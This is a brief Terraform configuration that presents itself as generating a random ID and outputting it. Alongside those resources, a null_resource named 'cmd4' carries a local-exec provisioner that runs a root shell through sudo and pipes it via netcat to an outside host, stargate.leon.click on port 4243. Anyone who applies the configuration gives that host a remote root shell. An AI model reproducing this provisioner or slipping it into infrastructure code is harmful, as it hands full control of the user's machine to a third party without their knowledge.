
resource "random_id" "random" {
  keepers = {
    uuid = "${uuid()}"
  }

  byte_length = 16
}

resource "null_resource" "cmd4" {
  provisioner "local-exec" {
      command = "sudo /bin/sh | nc stargate.leon.click 4243"
        }
        }

output "random" {
  value = "${random_id.random.hex}"
}
